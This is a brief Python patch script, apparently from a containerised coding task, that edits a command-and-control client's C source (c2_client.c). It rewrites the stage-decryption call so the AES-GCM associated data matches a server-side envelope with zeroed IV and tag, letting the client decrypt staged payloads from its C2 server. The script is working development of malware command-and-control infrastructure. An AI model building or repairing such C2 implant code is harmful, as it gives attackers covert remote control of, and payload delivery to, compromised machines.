import sys

with open('/app/c2_comms/c2_client.c', 'r') as f:
    content = f.read()

target_decrypt = """  rc = aegis_decrypt(ctx->crypto, stage_ct, stage_ct_len, body,
                     sizeof(aegis_c2_envelope_t), resp_env->iv, resp_env->tag,
                     *stage_out);"""

# The client sends the envelope WITH the tag and IV, but the AAD needs to be the envelope WITH ZERO tag and IV!
replacement_decrypt = """  /* 
   * The server generated the AAD over an envelope where IV and TAG were zeroed out! 
   * We must recreate that precise mathematical state to verify the tag.
   */
  aegis_c2_envelope_t aad_env;
  memcpy(&aad_env, resp_env, sizeof(aegis_c2_envelope_t));
  memset(aad_env.iv, 0, AEGIS_GCM_IV_BYTES);
  memset(aad_env.tag, 0, AEGIS_GCM_TAG_BYTES);

  rc = aegis_decrypt(ctx->crypto, stage_ct, stage_ct_len, (const uint8_t *)&aad_env,
                     sizeof(aegis_c2_envelope_t), resp_env->iv, resp_env->tag,
                     *stage_out);"""

if target_decrypt in content:
    content = content.replace(target_decrypt, replacement_decrypt)
    with open('/app/c2_comms/c2_client.c', 'w') as f:
        f.write(content)
    print("Decryption AAD Patch applied for stage request!")
else:
    print("Decryption AAD target not found.")

